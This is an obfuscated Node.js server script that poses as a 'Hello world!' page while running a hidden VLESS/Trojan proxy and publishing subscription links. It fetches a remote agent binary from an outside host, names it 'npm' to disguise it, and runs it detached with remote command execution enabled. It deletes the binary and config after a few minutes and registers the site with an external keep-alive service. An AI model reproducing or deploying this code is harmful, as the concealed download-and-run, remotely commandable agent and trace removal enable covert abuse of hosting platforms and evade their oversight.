const _0x312adb=_0x2fb2;function _0x2fb2(_0x1b6619,_0x33764a){const _0x3b86bf=_0x3b86();return _0x2fb2=function(_0x2fb221,_0x49df7c){_0x2fb221=_0x2fb221-0x155;let _0x30f8e5=_0x3b86bf[_0x2fb221];return _0x30f8e5;},_0x2fb2(_0x1b6619,_0x33764a);}(function(_0x442d12,_0x2ebfd2){const _0x14a3c0=_0x2fb2,_0x263be9=_0x442d12();while(!![]){try{const _0x4300cc=-parseInt(_0x14a3c0(0x1ba))/0x1*(parseInt(_0x14a3c0(0x175))/0x2)+-parseInt(_0x14a3c0(0x165))/0x3+-parseInt(_0x14a3c0(0x1a8))/0x4+-parseInt(_0x14a3c0(0x1b5))/0x5+parseInt(_0x14a3c0(0x18a))/0x6*(parseInt(_0x14a3c0(0x19b))/0x7)+parseInt(_0x14a3c0(0x18f))/0x8*(parseInt(_0x14a3c0(0x15e))/0x9)+parseInt(_0x14a3c0(0x18b))/0xa*(parseInt(_0x14a3c0(0x191))/0xb);if(_0x4300cc===_0x2ebfd2)break;else _0x263be9['push'](_0x263be9['shift']());}catch(_0x3279ab){_0x263be9['push'](_0x263be9['shift']());}}}(_0x3b86,0x8723c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x312adb(0x16d)),net=require(_0x312adb(0x188)),path=require(_0x312adb(0x185)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x312adb(0x1cf)][_0x312adb(0x1b3)]||_0x312adb(0x180),NEZHA_SERVER=process[_0x312adb(0x1cf)][_0x312adb(0x16a)]||'',NEZHA_PORT=process[_0x312adb(0x1cf)][_0x312adb(0x179)]||'',NEZHA_KEY=process['env'][_0x312adb(0x16f)]||'',DOMAIN=process[_0x312adb(0x1cf)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x312adb(0x1cf)][_0x312adb(0x157)]||!![],WSPATH=process[_0x312adb(0x1cf)][_0x312adb(0x194)]||UUID[_0x312adb(0x1b2)](0x0,0x8),SUB_PATH=process[_0x312adb(0x1cf)][_0x312adb(0x19c)]||_0x312adb(0x16b),NAME=process[_0x312adb(0x1cf)][_0x312adb(0x1b4)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3078fc=_0x312adb;try{const _0x1ee42f=await axios[_0x3078fc(0x1cc)](_0x3078fc(0x1ae)),_0x2996d9=_0x1ee42f[_0x3078fc(0x195)];ISP=(_0x2996d9[_0x3078fc(0x1c4)]+'-'+_0x2996d9[_0x3078fc(0x1a6)])[_0x3078fc(0x162)](/ /g,'_');}catch(_0x5aefb6){ISP=_0x3078fc(0x1be);}};GetISP();const httpServer=http[_0x312adb(0x172)]((_0x2926be,_0x4071f4)=>{const _0x51fa0e=_0x312adb;if(_0x2926be['url']==='/'){const _0xde011d=path['join'](__dirname,'index.html');fs[_0x51fa0e(0x164)](_0xde011d,_0x51fa0e(0x17b),(_0x5ce97b,_0x553d73)=>{const _0x5a764e=_0x51fa0e;if(_0x5ce97b){_0x4071f4['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x4071f4[_0x5a764e(0x169)](_0x5a764e(0x173));return;}_0x4071f4[_0x5a764e(0x181)](0xc8,{'Content-Type':_0x5a764e(0x19e)}),_0x4071f4[_0x5a764e(0x169)](_0x553d73);});return;}else{if(_0x2926be[_0x51fa0e(0x1bf)]==='/'+SUB_PATH){const _0x40e3c9=NAME?NAME+'-'+ISP:ISP,_0x145772='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x51fa0e(0x160)+DOMAIN+_0x51fa0e(0x184)+WSPATH+'#'+_0x40e3c9,_0x144522=_0x51fa0e(0x163)+UUID+'@'+DOMAIN+_0x51fa0e(0x1a0)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x51fa0e(0x184)+WSPATH+'#'+_0x40e3c9,_0x159c6a=_0x145772+'\x0a'+_0x144522,_0x3f76f0=Buffer[_0x51fa0e(0x17a)](_0x159c6a)[_0x51fa0e(0x166)](_0x51fa0e(0x15a));_0x4071f4['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x4071f4[_0x51fa0e(0x169)](_0x3f76f0+'\x0a');}else _0x4071f4['writeHead'](0x194,{'Content-Type':_0x51fa0e(0x178)}),_0x4071f4['end'](_0x51fa0e(0x16c));}}),wss=new WebSocket[(_0x312adb(0x1c6))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x1779e9){return new Promise((_0x4287d4,_0x1ae3cd)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1779e9)){_0x4287d4(_0x1779e9);return;}let _0x32534e=0x0;function _0x210b66(){const _0x4bc9fc=_0x2fb2;if(_0x32534e>=DNS_SERVERS[_0x4bc9fc(0x1b0)]){_0x1ae3cd(new Error(_0x4bc9fc(0x190)+_0x1779e9+_0x4bc9fc(0x17d)));return;}const _0x219129=DNS_SERVERS[_0x32534e];_0x32534e++;const _0x9d1b7f=_0x4bc9fc(0x1a2)+encodeURIComponent(_0x1779e9)+_0x4bc9fc(0x17f);axios[_0x4bc9fc(0x1cc)](_0x9d1b7f,{'timeout':0x1388,'headers':{'Accept':_0x4bc9fc(0x1ad)}})[_0x4bc9fc(0x196)](_0x8fd04b=>{const _0x3cec38=_0x4bc9fc,_0x1ba322=_0x8fd04b[_0x3cec38(0x195)];if(_0x1ba322[_0x3cec38(0x176)]===0x0&&_0x1ba322[_0x3cec38(0x1ac)]&&_0x1ba322['Answer'][_0x3cec38(0x1b0)]>0x0){const _0x36711e=_0x1ba322[_0x3cec38(0x1ac)][_0x3cec38(0x1b9)](_0x3af3bc=>_0x3af3bc['type']===0x1);if(_0x36711e){_0x4287d4(_0x36711e[_0x3cec38(0x195)]);return;}}_0x210b66();})[_0x4bc9fc(0x156)](_0x22e45d=>{_0x210b66();});}_0x210b66();});}function _0x3b86(){const _0x55be0a=['utf-8','base64','pipe','every','arch','4918122WwHaXU','8443','&fp=chrome&type=ws&host=','createHash','replace','trojan://','readFile','741399kMBCQI','toString','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/v1','end','NEZHA_SERVER','sub','Not\x20Found\x0a','axios','readUInt8','NEZHA_KEY','\x20-p\x20','sha224','createServer','Hello\x20world!','true','2194eOvJXz','Status','update','text/plain','NEZHA_PORT','from','utf8','map','\x20with\x20all\x20DNS\x20servers','close','&type=A','173CFB18-5DD5-0DA2-484C-1CCF5AB9E9BD','writeHead','once','log','&path=%2F','path','digest','chmod\x20+x\x20npm','net','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','930252vgXKTG','10zqjRsy','Automatic\x20Access\x20Task\x20added\x20successfully','error:\x20','2053','8xodAsN','Failed\x20to\x20resolve\x20','30490735YjzoUD','2087','config.yaml','WSPATH','data','then','send','false','aarch64','includes','7oNgClP','SUB_PATH','join','text/html','arm',':443?security=tls&sni=','npm\x20is\x20running','https://dns.google/resolve?name=','npm\x20download\x20successfully','hex','client_secret:\x20','isp','https://amd64.ssss.nyc.mn/agent','2460944bBDMTL','trim','error','writeFileSync','Answer','application/dns-json','https://api.ip.sb/geoip','Server\x20is\x20running\x20on\x20port\x20','length','/bin/bash','slice','UUID','NAME','4939545ppzway','pop','decode','connect','find','975NUmvPV','finish','https://oooo.serv00.net/add-url','split','Unknown','url','https://amd64.ssss.nyc.mn/v1','reduce','arm64','substr','country_code','https://arm64.ssss.nyc.mn/agent','Server','connection','readUInt16BE','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','message','get','createWriteStream','unlink','env','write','catch','AUTO_ACCESS','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running'];_0x3b86=function(){return _0x55be0a;};return _0x3b86();}function handleVlessConnection(_0x20092f,_0x54925f){const _0x252059=_0x312adb,[_0x188450]=_0x54925f,_0x51e781=_0x54925f[_0x252059(0x1b2)](0x1,0x11);if(!_0x51e781[_0x252059(0x15c)]((_0x21f4c7,_0xb98678)=>_0x21f4c7==parseInt(uuid['substr'](_0xb98678*0x2,0x2),0x10)))return![];let _0x1c292b=_0x54925f[_0x252059(0x1b2)](0x11,0x12)[_0x252059(0x16e)]()+0x13;const _0x5c1d84=_0x54925f[_0x252059(0x1b2)](_0x1c292b,_0x1c292b+=0x2)[_0x252059(0x1c8)](0x0),_0x3c8bcd=_0x54925f['slice'](_0x1c292b,_0x1c292b+=0x1)['readUInt8'](),_0x5d0d03=_0x3c8bcd==0x1?_0x54925f[_0x252059(0x1b2)](_0x1c292b,_0x1c292b+=0x4)['join']('.'):_0x3c8bcd==0x2?new TextDecoder()[_0x252059(0x1b7)](_0x54925f[_0x252059(0x1b2)](_0x1c292b+0x1,_0x1c292b+=0x1+_0x54925f[_0x252059(0x1b2)](_0x1c292b,_0x1c292b+0x1)[_0x252059(0x16e)]())):_0x3c8bcd==0x3?_0x54925f[_0x252059(0x1b2)](_0x1c292b,_0x1c292b+=0x10)[_0x252059(0x1c1)]((_0x5a4baa,_0x491a6c,_0x14fe9a,_0x5ed11a)=>_0x14fe9a%0x2?_0x5a4baa['concat'](_0x5ed11a[_0x252059(0x1b2)](_0x14fe9a-0x1,_0x14fe9a+0x1)):_0x5a4baa,[])[_0x252059(0x17c)](_0x1a689b=>_0x1a689b['readUInt16BE'](0x0)[_0x252059(0x166)](0x10))[_0x252059(0x19d)](':'):'';_0x20092f[_0x252059(0x197)](new Uint8Array([_0x188450,0x0]));const _0x38448b=createWebSocketStream(_0x20092f);return resolveHost(_0x5d0d03)[_0x252059(0x196)](_0x3eb628=>{net['connect']({'host':_0x3eb628,'port':_0x5c1d84},function(){const _0x5d7b6f=_0x2fb2;this[_0x5d7b6f(0x155)](_0x54925f['slice'](_0x1c292b)),_0x38448b['on'](_0x5d7b6f(0x1aa),()=>{})['pipe'](this)['on'](_0x5d7b6f(0x1aa),()=>{})[_0x5d7b6f(0x15b)](_0x38448b);})['on']('error',()=>{});})[_0x252059(0x156)](_0x5a0706=>{const _0x244f3a=_0x252059;net[_0x244f3a(0x1b8)]({'host':_0x5d0d03,'port':_0x5c1d84},function(){const _0x532e75=_0x244f3a;this['write'](_0x54925f[_0x532e75(0x1b2)](_0x1c292b)),_0x38448b['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x532e75(0x15b)](_0x38448b);})['on'](_0x244f3a(0x1aa),()=>{});}),!![];}function handleTrojanConnection(_0x2ebce9,_0x81906f){const _0x32b376=_0x312adb;try{if(_0x81906f[_0x32b376(0x1b0)]<0x3a)return![];const _0x2593fb=_0x81906f[_0x32b376(0x1b2)](0x0,0x38)[_0x32b376(0x166)](),_0x154dd8=[UUID];let _0x48da75=null;for(const _0x2210dc of _0x154dd8){const _0x28ee9a=crypto[_0x32b376(0x161)](_0x32b376(0x171))[_0x32b376(0x177)](_0x2210dc)[_0x32b376(0x186)](_0x32b376(0x1a4));if(_0x28ee9a===_0x2593fb){_0x48da75=_0x2210dc;break;}}if(!_0x48da75)return![];let _0x3c9abb=0x38;_0x81906f[_0x3c9abb]===0xd&&_0x81906f[_0x3c9abb+0x1]===0xa&&(_0x3c9abb+=0x2);const _0x2ca11e=_0x81906f[_0x3c9abb];if(_0x2ca11e!==0x1)return![];_0x3c9abb+=0x1;const _0x1ffbc4=_0x81906f[_0x3c9abb];_0x3c9abb+=0x1;let _0x5b1ed5,_0x2cf38c;if(_0x1ffbc4===0x1)_0x5b1ed5=_0x81906f[_0x32b376(0x1b2)](_0x3c9abb,_0x3c9abb+0x4)[_0x32b376(0x19d)]('.'),_0x3c9abb+=0x4;else{if(_0x1ffbc4===0x3){const _0x4fbfc9=_0x81906f[_0x3c9abb];_0x3c9abb+=0x1,_0x5b1ed5=_0x81906f[_0x32b376(0x1b2)](_0x3c9abb,_0x3c9abb+_0x4fbfc9)[_0x32b376(0x166)](),_0x3c9abb+=_0x4fbfc9;}else{if(_0x1ffbc4===0x4)_0x5b1ed5=_0x81906f[_0x32b376(0x1b2)](_0x3c9abb,_0x3c9abb+0x10)['reduce']((_0x1f0d86,_0x541245,_0x37e12d,_0x1f851d)=>_0x37e12d%0x2?_0x1f0d86['concat'](_0x1f851d[_0x32b376(0x1b2)](_0x37e12d-0x1,_0x37e12d+0x1)):_0x1f0d86,[])[_0x32b376(0x17c)](_0x147f02=>_0x147f02[_0x32b376(0x1c8)](0x0)[_0x32b376(0x166)](0x10))[_0x32b376(0x19d)](':'),_0x3c9abb+=0x10;else return![];}}_0x2cf38c=_0x81906f[_0x32b376(0x1c8)](_0x3c9abb),_0x3c9abb+=0x2;_0x3c9abb<_0x81906f[_0x32b376(0x1b0)]&&_0x81906f[_0x3c9abb]===0xd&&_0x81906f[_0x3c9abb+0x1]===0xa&&(_0x3c9abb+=0x2);const _0x597e2a=createWebSocketStream(_0x2ebce9);return resolveHost(_0x5b1ed5)['then'](_0x941275=>{const _0x3d8cb9=_0x32b376;net[_0x3d8cb9(0x1b8)]({'host':_0x941275,'port':_0x2cf38c},function(){const _0x2c32a3=_0x3d8cb9;_0x3c9abb<_0x81906f['length']&&this[_0x2c32a3(0x155)](_0x81906f[_0x2c32a3(0x1b2)](_0x3c9abb)),_0x597e2a['on'](_0x2c32a3(0x1aa),()=>{})[_0x2c32a3(0x15b)](this)['on'](_0x2c32a3(0x1aa),()=>{})[_0x2c32a3(0x15b)](_0x597e2a);})['on'](_0x3d8cb9(0x1aa),()=>{});})[_0x32b376(0x156)](_0x255b49=>{const _0x3efd60=_0x32b376;net[_0x3efd60(0x1b8)]({'host':_0x5b1ed5,'port':_0x2cf38c},function(){const _0x4bcdb0=_0x3efd60;_0x3c9abb<_0x81906f[_0x4bcdb0(0x1b0)]&&this[_0x4bcdb0(0x155)](_0x81906f['slice'](_0x3c9abb)),_0x597e2a['on'](_0x4bcdb0(0x1aa),()=>{})['pipe'](this)['on'](_0x4bcdb0(0x1aa),()=>{})[_0x4bcdb0(0x15b)](_0x597e2a);})['on']('error',()=>{});}),!![];}catch(_0x468463){return![];}}wss['on'](_0x312adb(0x1c7),(_0x207e17,_0x4a4e87)=>{const _0x5bfe48=_0x312adb,_0x13510d=_0x4a4e87[_0x5bfe48(0x1bf)]||'';_0x207e17[_0x5bfe48(0x182)](_0x5bfe48(0x1cb),_0x339ff0=>{const _0x10efcc=_0x5bfe48;if(_0x339ff0[_0x10efcc(0x1b0)]>0x11&&_0x339ff0[0x0]===0x0){const _0x799711=_0x339ff0[_0x10efcc(0x1b2)](0x1,0x11),_0x45df10=_0x799711[_0x10efcc(0x15c)]((_0x2d6b85,_0x3ffd6f)=>_0x2d6b85==parseInt(uuid[_0x10efcc(0x1c3)](_0x3ffd6f*0x2,0x2),0x10));if(_0x45df10){!handleVlessConnection(_0x207e17,_0x339ff0)&&_0x207e17[_0x10efcc(0x17e)]();return;}}!handleTrojanConnection(_0x207e17,_0x339ff0)&&_0x207e17['close']();})['on'](_0x5bfe48(0x1aa),()=>{});});const getDownloadUrl=()=>{const _0x6f8d6c=_0x312adb,_0x16bed6=os[_0x6f8d6c(0x15d)]();return _0x16bed6===_0x6f8d6c(0x19f)||_0x16bed6===_0x6f8d6c(0x1c2)||_0x16bed6===_0x6f8d6c(0x199)?!NEZHA_PORT?_0x6f8d6c(0x168):_0x6f8d6c(0x1c5):!NEZHA_PORT?_0x6f8d6c(0x1c0):_0x6f8d6c(0x1a7);},downloadFile=async()=>{const _0xb74385=_0x312adb;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x7bc279=getDownloadUrl(),_0x2bb19a=await axios({'method':_0xb74385(0x1cc),'url':_0x7bc279,'responseType':'stream'}),_0x248b4e=fs[_0xb74385(0x1cd)]('npm');return _0x2bb19a[_0xb74385(0x195)][_0xb74385(0x15b)](_0x248b4e),new Promise((_0x1e8354,_0x5ece41)=>{const _0x5df44d=_0xb74385;_0x248b4e['on'](_0x5df44d(0x1bb),()=>{const _0x5dc8f9=_0x5df44d;console[_0x5dc8f9(0x183)](_0x5dc8f9(0x1a3)),exec(_0x5dc8f9(0x187),_0x3e3469=>{if(_0x3e3469)_0x5ece41(_0x3e3469);_0x1e8354();});}),_0x248b4e['on'](_0x5df44d(0x1aa),_0x5ece41);});}catch(_0x58c836){throw _0x58c836;}},runnz=async()=>{const _0x314e45=_0x312adb;try{const _0xf3f09=execSync(_0x314e45(0x1ca),{'encoding':_0x314e45(0x159)});if(_0xf3f09[_0x314e45(0x1a9)]()!==''){console[_0x314e45(0x183)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x465686){}await downloadFile();let _0x10b3b6='',_0x290443=['443',_0x314e45(0x15f),'2096',_0x314e45(0x192),'2083',_0x314e45(0x18e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4cbd36=_0x290443[_0x314e45(0x19a)](NEZHA_PORT)?'--tls':'';_0x10b3b6='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x314e45(0x170)+NEZHA_KEY+'\x20'+_0x4cbd36+_0x314e45(0x1c9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1ee39a=NEZHA_SERVER[_0x314e45(0x19a)](':')?NEZHA_SERVER[_0x314e45(0x1bd)](':')[_0x314e45(0x1b6)]():'',_0x4e9b49=_0x290443[_0x314e45(0x19a)](_0x1ee39a)?_0x314e45(0x174):_0x314e45(0x198),_0x4c85f3=_0x314e45(0x1a5)+NEZHA_KEY+_0x314e45(0x167)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4e9b49+_0x314e45(0x189)+UUID;fs[_0x314e45(0x1ab)](_0x314e45(0x193),_0x4c85f3);}_0x10b3b6='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x314e45(0x183)](_0x314e45(0x158));return;}}try{exec(_0x10b3b6,{'shell':_0x314e45(0x1b1)},_0x2d4ddf=>{const _0x4f0ac6=_0x314e45;if(_0x2d4ddf)console[_0x4f0ac6(0x1aa)]('npm\x20running\x20error:',_0x2d4ddf);else console[_0x4f0ac6(0x183)](_0x4f0ac6(0x1a1));});}catch(_0xf8817){console[_0x314e45(0x1aa)](_0x314e45(0x18d)+_0xf8817);}};async function addAccessTask(){const _0x37f2d8=_0x312adb;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x478a9c='https://'+DOMAIN;try{const _0x2287af=await axios['post'](_0x37f2d8(0x1bc),{'url':_0x478a9c},{'headers':{'Content-Type':'application/json'}});console[_0x37f2d8(0x183)](_0x37f2d8(0x18c));}catch(_0x552817){}}const delFiles=()=>{const _0x55b5e2=_0x312adb;fs[_0x55b5e2(0x1ce)]('npm',()=>{}),fs[_0x55b5e2(0x1ce)](_0x55b5e2(0x193),()=>{});};httpServer['listen'](PORT,()=>{const _0x569aef=_0x312adb;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x569aef(0x1af)+PORT);});
